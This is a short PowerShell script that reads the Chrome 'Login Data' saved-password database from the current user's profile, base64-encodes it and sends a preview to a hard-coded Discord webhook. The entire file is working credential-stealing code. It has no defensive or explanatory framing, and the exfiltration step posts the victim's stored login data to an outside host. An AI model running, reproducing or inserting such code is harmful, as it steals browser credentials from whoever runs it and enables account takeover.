# Set the path to your file
$filePath = "$env:USERPROFILE\AppData\Local\Google\Chrome\User Data\Default\Login Data"

# Check if the file exists using -LiteralPath to handle spaces correctly
if (-Not (Test-Path -LiteralPath $filePath)) {
    Write-Host "File not found: $filePath"
    exit
}

# Read the file content as bytes
$fileBytes = [System.IO.File]::ReadAllBytes($filePath)

# Convert bytes to Base64 string
$fileBase64 = [System.Convert]::ToBase64String($fileBytes)

# Discord webhook URL
$webhookUrl = "https://discord.com/api/webhooks/1374075895941169322/0q_M5862QHhmUHeIUIu9b0Y_L2feBqu-tbTz3gsbEiASX5HtOc8gwfh5fNMajSnbCrOq"

# Prepare the content message with base64 text inside code block (cutting it to avoid Discord limits)
$maxLength = 1900
$preview = $fileBase64.Substring(0, [Math]::Min($fileBase64.Length, $maxLength))

$payload = @{
    content = "Base64 preview of Login Data (first $maxLength chars):`n```txt`n$preview`n```"
} | ConvertTo-Json -Compress

# Send POST request
Invoke-RestMethod -Uri $webhookUrl -Method Post -Body $payload -ContentType 'application/json'

Write-Host "Base64 file preview sent to Discord webhook."
